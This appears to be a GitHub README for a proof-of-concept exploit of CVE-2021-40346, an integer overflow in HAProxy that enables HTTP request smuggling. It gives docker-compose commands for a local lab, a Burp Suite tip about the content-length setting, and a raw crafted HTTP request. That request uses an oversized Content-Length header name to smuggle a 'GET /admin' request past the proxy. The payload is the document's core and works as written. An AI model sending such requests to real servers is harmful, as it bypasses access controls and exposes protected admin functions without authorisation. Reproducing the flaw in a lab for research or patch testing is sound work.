# CVE-2021-40346-POC #

CVE-2021-40346 integer overflow enables http smuggling


## Build ##
```sh
cd 6-haproxy
docker-compose build 
docker-compose up -d
```

## Burp Suite
Remember to uncheck "update content length" when dealing with Smuggling in Burp! \
![image](https://user-images.githubusercontent.com/31791455/140394586-6a44d0f5-363e-455c-b22b-f619868bcc87.png)


## Exploit ##
Be careful - note that an extra line might break the exploit.
```
POST /guest HTTP/1.1
Host: localhost:10001
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 23

GET /admin HTTP/1.1
h:GET /guest HTTP/1.1
Host: localhost:10001



```
## Recommended reading:
https://forum.butian.net/share/694
https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/

## Credits:
https://github.com/donky16/CVE-2021-40346-POC


